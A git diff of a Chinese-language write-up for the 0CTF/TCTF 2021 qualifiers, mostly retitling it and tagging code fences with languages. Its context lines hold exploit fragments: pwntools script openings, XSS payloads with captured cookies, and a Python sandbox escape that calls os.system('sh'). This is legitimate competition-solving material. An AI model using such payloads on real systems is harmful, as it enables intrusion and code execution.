@@ -1,4 +1,4 @@
-# TCTF-quals-2021 writeup
+# 0CTF/TCTF 2021 Quals Writeup
 
 ## Pwn
 
@@ -343,7 +343,7 @@ jmp qword ptr [rsp];
 
 我这里在代码中加入了很笨的hook代码来观察RIP和RSP，来确保程序真的跳了过去
 
-```
+```python
 def ctf_hook(uc, address, size, user_data):
     rsp = uc.reg_read(UC_X86_REG_RSP)
     rip = uc.reg_read(UC_X86_REG_RIP)
@@ -380,7 +380,7 @@ uc.hook_add(UC_HOOK_CODE, ctf_hook, None, 1, 0)
 
 之后写了个代码来不断观察发生变化后的ADMIN代码，人工找一下什么时候我们可以有操作空间，只要不断修改下面的offset变量就可以了
 
-```
+```python
 from pwn import *
 from capstone import *
 
@@ -488,7 +488,7 @@ offset=0x9a的时候，我发现了可以操作的点，此时的ADMIN代码被�
 
 
 
-```
+```python
 from pwn import *
 
 context.log_level = "debug"
@@ -545,7 +545,7 @@ abs的漏洞，不过这次是abs8，当参数为0x80时可以uaf
 
 EXP:
 
-```
+```python
 from pwn import *
 context.arch='amd64'
 def cmd(c):
@@ -617,7 +617,7 @@ edit处大小比较有问题可以用0x80000000来造成溢出。
 
 Exp:
 
-```
+```python
 from pwn import *#context.log_level='debug'
 context.arch='amd64'
 context.terminal=['tmux','split','-h']
@@ -699,7 +699,7 @@ p.interactive()
 
 然后用vip bitmap操作的负数下标越界访问到bss上的内容。读master_key，改dhcp_pool，用req_vip的整数截断leak canary，在req_vip里栈溢出。
 
-```
+```python
 from pwn import *
 
 context.log_level = 'debug'
@@ -855,7 +855,7 @@ req_vip(master, baseip + 10)
 
 
 
-```
+```python
 from pwn import *
 
 context.log_level = 'debug'
@@ -880,7 +880,7 @@ open('out', 'wb').write(out)
 
 Leak坑在于远程堆layout不同
 
-```
+```python
 # leak.py
 from pwn import *
 
@@ -1051,7 +1051,7 @@ PHP_SESSION_UPLOAD_PROGRESS 上传 + 文件包含漏洞 进行条件竞争。
 
 完整的 EXP：
 
-```
+```python
 #encoding:utf-8
 import io
 import requests
@@ -1143,13 +1143,13 @@ event.set()
 
 ### Worldcup
 
-第一层：nikename= `'`+`，msg= `};alert(1)// 
+第一层：```nickname=<`'`+`，msg= `};alert(1)// </code>```
 
 ```
 set cookie: level1 NoQWeCy70QekDB5b
 ```
 
-第二层：nickname= `'`};(`，msg= `);alert(1)// 
+第二层： ```nickname= `'`};(`，msg= `);alert(1)// </code>```
 
 ```
 set cookie: level2 Autx5F53FmmSFayM
@@ -1169,7 +1169,7 @@ Golang text/template 的 SSTI：
 
 用fork实现的虚拟机 (todo)
 
-```
+```python
 x = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
      1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
      1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
@@ -1259,7 +1259,7 @@ check某一行(或某一列)从左到右/从右到左(或从上到下/从下到�
 
 dfs搜索加剪枝
 
-```
+```cpp
 #include <cstdio>
 #include <cstdlib>
 #include <vector>
@@ -1516,7 +1516,7 @@ x = [9,8,4,5,3,2,10,1,6,7,
 
 调试一下发现返回地址和数据的偏移为39312。需要爆破1/16后门地址。多试几次就出来了
 
-```
+```python
 from pwn import *
 x = [9,8,4,5,3,2,10,1,6,7,
 2,7,8,3,1,5,9,4,10,6,
@@ -1551,7 +1551,7 @@ print(p.recvall())
 
 思路：过反调，gdb调试，获取到超大函数结果，z3 求解即可。
 
-```
+```python
 from pwn import *
 import base64
 from hashlib import sha256
@@ -1607,7 +1607,7 @@ p.interactive()
 
 z3求解：
 
-```
+```python
 import gdb
 from z3 import *
 
@@ -1806,7 +1806,7 @@ mysolve(ans_0, ans_1)
 
 简单的计算题，用python写了一个太慢了，换C语言就可以了
 
-```
+```c
 #include <gmp.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -1833,7 +1833,7 @@ int main(int argc, char **argv)
 
 发现可以用z3直接解。然后改了一下n2l就过了
 
-```
+```python
 from pwn import *
 import hashlib
 import random
@@ -2029,7 +2029,7 @@ r.interactive()
 
 代码只能有一个block
 
-```
+```c
 #include <inttypes.h>
 #include <stdio.h>
 
@@ -2168,13 +2168,13 @@ gcc -O3 编译到汇编，自动循环展开
 
 参考 https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes#python3
 
-```
+```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('sh')
 ```
 
 Gift: __class__,  __dict__
 
-```
+```python
 sub = ''.__class__.__base__.__subclasses__()
 wrap = sub[133] # os._wrap_close
 init = wrap.__init__
@@ -2210,7 +2210,7 @@ f"{glb}" 包含 system 和 sh
 
 init.__class__.__dict__["__getattribute__"] 不能用。。但是可以找到attrgetter
 
-```
+```python
 attrgetter = [ x for x in ''.__class__.__base__.__subclasses__() if "operator.attrgetter" in str(x) ][0]
 ```
 
@@ -2220,7 +2220,7 @@ attrgetter = [ x for x in ''.__class__.__base__.__subclasses__() if "operator.at
 
 
 
-```
+```python
 import types
 import dis
 import os
@@ -2586,7 +2586,7 @@ A6,F#6-D#6
 
 将gas通过构造的指令消耗完即可，runtime bytecode长度只要小于100即可
 
-```
+```python
 # 0x00
 s = '5b'         # jumpdest                    1
 s += '6050'       # push1 0x50     3
